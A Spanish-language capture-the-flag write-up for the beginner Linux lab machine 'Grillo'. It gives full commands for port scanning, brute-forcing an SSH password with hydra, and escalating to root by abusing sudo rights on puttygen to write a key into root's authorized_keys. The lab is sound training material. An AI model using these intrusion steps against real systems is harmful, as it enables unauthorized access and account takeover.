---
title: "TheHackerLabs - Principiante : [Grillo]"
date: 2024-05-10 14:00:00 +0200
categories: [CTF, Writeups, Thehackerslabs, Linux, Principiante]
tags: [CTF, Writeups, Thehackerslabs, Linux, Principiante]
image: /img/posts/CTF/grillo/grillo.png
---


### Writeup para el CTF **Grillo**

---

## Introducción

Hoy exploraremos la máquina CTF **Grillo**, diseñada para introducirnos al mundo del hacking ético y la resolución de retos. 

- **Nivel de Dificultad**: Principiante.  
- **Creadores**: **CuriosidadesDeHackers** y **Condor**.  
- Más detalles en [The Hacker's Labs](https://thehackerslabs.com/grillo/).  
- **Sistema Operativo**: Linux.  

![CTF Grillo](/img/posts/CTF/grillo/grillo.png)

---

## Información Inicial

Descargamos la máquina y la configuramos en VirtualBox.  
La IP asignada es **192.168.10.129**. 

![VirtualBox CTF Grillo](/img/posts/CTF/grillo/vboxgrillo.png)

Realizamos un escaneo completo para identificar puertos abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv 192.168.10.129 -oG grillo
```

**Resultados:**

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

A continuación, ejecutamos un escaneo detallado:

```bash
sudo nmap -p22,80 -sCV 192.168.10.129 -oG grillo-ports
```

**Resultados detallados:**

```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
```

---

## Análisis Inicial

Accedemos al puerto 80 y encontramos una página estándar de Apache2 Debian. En el pie de página, un comentario revela un posible nombre de usuario: **melanie**.

![Comentario revelador](/img/posts/CTF/grillo/apache-melanie.png)

---

## Fuerza Bruta en SSH

Con el usuario `melanie`, realizamos un ataque de fuerza bruta para descubrir su contraseña usando `hydra`:

```bash
hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.129
```

**Resultados:**

```bash
[22][ssh] host: 192.168.10.129   login: melanie   password: trustno1
```

---

## Acceso Inicial: Usuario `melanie`

Nos conectamos al servidor con las credenciales obtenidas:

```bash
ssh melanie@192.168.10.129
```

Exploramos su directorio personal y encontramos la primera flag:

```bash
melanie@grillo:~$ ls
user.txt
```

¡Primera flag conseguida!

---

## Escalada de Privilegios

Revisamos los privilegios sudo del usuario `melanie`:

```bash
sudo -l
```

**Resultados:**

```bash
User melanie may run the following commands on grillo:
    (root) NOPASSWD: /usr/bin/puttygen
```

Utilizamos `puttygen` para generar una clave privada RSA:

```bash
puttygen -t rsa -o id_rsa -O private-openssh
```

Ajustamos los permisos de la clave privada:

```bash
chmod 600 id_rsa
```

Preparamos la clave pública y la añadimos al archivo `authorized_keys` de root:

```bash
sudo /usr/bin/puttygen id_rsa -o /root/.ssh/authorized_keys -O public-openssh
```

Finalmente, nos conectamos como root usando la clave generada:

```bash
ssh -i id_rsa root@192.168.10.129
root@grillo:~# 
root@grillo:~# ls
root.txt
```

---

## Conclusión

Tras obtener acceso root, encontramos la segunda flag en el directorio `/root`. ¡Reto completado!
